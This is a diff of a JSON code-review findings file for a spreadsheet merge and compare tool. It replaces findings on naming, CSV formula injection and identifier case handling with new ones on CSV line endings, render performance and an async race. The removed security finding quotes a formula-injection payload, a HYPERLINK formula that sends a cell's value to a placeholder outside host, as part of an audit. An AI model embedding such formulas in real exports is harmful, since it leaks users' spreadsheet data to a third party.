@@ -1,5 +1,5 @@
 {
-  "attestation_id": "sha256:537e1795fd8d43fc7e5ea705243432083887b5dc707e457b932189dbf56842f0",
+  "attestation_id": "sha256:8a4a3f678a874b6fb6112eb5cadb03724828bb4f981400325fd36a21b1d59934",
   "available": true,
   "by_severity": {
     "critical": 0,
@@ -11,30 +11,30 @@
   "findings": [
     {
       "category": "code-smell",
-      "detail": "`keyOf()` correctly switches the per-file state maps from file name to a WeakMap-assigned id (`file-1`, `file-2`, …), which is the fix for two uploads called `export.xlsx` collapsing into one. But the four helpers that consume those keys kept their old parameter names: `removeFile(name: string)` (:109), `moveCol(fileName: string, …)` (:123), `updateCol(fileName: string, …)` (:135) and `getProcessedDataForFile(fileName: string)` (:143). The names now actively lie about what they accept, and `f.name` is still in scope at every call site (:180, :199, :284, :362). A future caller who writes `getProcessedDataForFile(f.name)` gets `allFiles.find(f => keyOf(f) === 'export.xlsx')` → `undefined` → an early `return []`, which surfaces as an empty merged sheet with no error and no log line — the same silent-wrong-output class this PR exists to close. The handbook's stringly-typed smell applies: the key is a distinct concept with a lookalike string type.",
+      "detail": "The docstring on line 251 states \"RFC 4180-style CSV\", but line 254 joins records with `'\\n'`. RFC 4180 section 2.1 mandates CRLF as the record separator. No user impact — Excel, LibreOffice and Google Sheets all accept LF-terminated records, and the unit test on `compareRules.test.ts:189` pins the current LF behaviour deliberately. It is only the comment that over-claims, and in a file where every other comment is precise about exactly what it does and does not guarantee, this one sends the next reader to the wrong spec.",
+      "file": "utils/compareUtils.ts",
+      "line": 251,
+      "severity": "low",
+      "suggested_fix": null,
+      "summary": "toCsv doc says RFC 4180 but emits LF line endings"
+    },
+    {
+      "category": "performance",
+      "detail": "`settingsKey` serialises `fileColumns` (one `ColDef` object per column per file) on every single render, including renders that cannot change it — `setActiveTab`, `setStatus`, and the per-keystroke re-renders from the column-rename `<input>` on line 677. With 10 files x 100 columns that is a ~100 KB string rebuilt per keystroke while the user is typing a header name. Not a freeze, but it is pure waste in the interaction path the Structure tab is built around, and the handbook's rule 5 covers recreating stable values every render.",
       "file": "components/MergeTool.tsx",
-      "line": 143,
+      "line": 269,
       "severity": "low",
       "suggested_fix": null,
-      "summary": "Merge helpers still named `name`/`fileName` but now take an opaque file id"
+      "summary": "settingsKey JSON.stringify runs on every MergeTool render"
     },
     {
-      "category": "security",
-      "detail": "`toCsv` wraps every cell in quotes and doubles embedded quotes, which fixes the `#`-truncation bug it was written for. It does not stop CSV formula injection: Excel strips the surrounding quotes on import and still evaluates a field whose first character is `=`, `+`, `@`, TAB or CR, so a source spreadsheet cell containing `=HYPERLINK(\"http://x/\"&A1,\"click\")` is re-armed as a live formula in `Comparison_*.csv`. This is NOT a regression — the inline builder this replaced produced the same bytes — and the data is the user's own upload opened by the same user, which is why it is low rather than medium. What would raise it: Compare growing a path where the exported CSV is shared with, or generated from data supplied by, someone other than the person who opens it. Note the XLSX path is already safe — SheetJS writes these as `t:'s'` text cells, and `aiInsightsRows` (model output) only ever reaches that path, so handbook rule 5 is not violated here.",
-      "file": "utils/compareUtils.ts",
-      "line": 225,
+      "category": "react",
+      "detail": "`lastRunSettings.current` is only assigned AFTER the run completes (line 234), so the clearing effect is unarmed for the whole duration of a run. In `separate` output mode the run genuinely yields at `await zip.generateAsync(...)`, so a user can switch output mode mid-run. Sequence: user changes mode -> effect fires with the new `settingsKey` but bails because `lastRunSettings.current` is still `null` -> the async body then completes and writes `lastRunSettings.current = <old settingsKey>` plus `setSeparateZips(content)` and `setStatus(COMPLETED)`. The effect never re-runs (its dep `settingsKey` has not changed since), so the result produced under the old settings survives the change the guard exists to catch. Concretely: `downloadResult()` then takes neither branch (`outputMode` is no longer `'separate'`, `mergedData` is `null`), so the visible \"Download Output File\" button does nothing. Narrow trigger and no wrong data is written, hence low; it would be medium if the single/sheets paths also yielded, since then the stale result would actually download under the new settings.",
+      "file": "components/MergeTool.tsx",
+      "line": 274,
       "severity": "low",
       "suggested_fix": null,
-      "summary": "`toCsv` quotes cells but does not neutralise leading `=` / `+` / `@`"
-    },
-    {
-      "category": "technical-debt",
-      "detail": "`utils/identifiers.ts:28-33` documents D7 as 'Deliberately NOT changed … **case** — identifiers are compared as exact text', and that is how Files Validation uses it. Both call sites added by this PR wrap it the other way: `compareKey` here is `identifierKey(v).toLowerCase()` (:69) and `utils/dedupe.ts:36` does `identifierKey(row[c]).toLowerCase()`. That is the right call for these two tools — it preserves their pre-existing behaviour, the inline comments say so, and `tests/unit/dedupe.test.ts` pins it ('is case-insensitive and trims, as before') — but it means `SKU-A` and `sku-a` are now one identifier in Compare and Deduplicate and two in Files Validation, while the shared helper's docblock asserts only the latter. Someone reading `identifiers.ts` to answer 'does this app treat SKUs case-sensitively?' gets the wrong answer for two of the three tools. Cheap to fix now, expensive once the next tool picks a third policy by copying whichever call site it found first.",
-      "file": "utils/compareUtils.ts",
-      "line": 69,
-      "severity": "low",
-      "suggested_fix": null,
-      "summary": "`identifierKey` doc states case is significant; both new callers lower-case it"
+      "summary": "Stale-result guard misses settings changed during async processing"
     }
   ],
   "schema": "apexyard.evidence.findings/1",
